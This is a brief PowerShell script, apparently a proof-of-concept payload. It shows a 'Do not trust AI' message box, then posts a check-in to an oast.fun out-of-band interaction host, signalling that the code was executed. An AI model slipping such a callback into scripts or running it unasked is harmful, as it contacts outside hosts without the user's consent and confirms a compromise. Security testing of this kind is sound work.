Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show('Clippy says: Do not trust AI', 'Warning', 'OK', 'Warning')

# Send a POST request to the specified URL
Invoke-WebRequest -Uri 'https://usocqduwzlwhbjyqgprlb893tthyfn6u9.oast.fun/zerodayquestcheckin' -Method Post -Body @{status="check-in"}
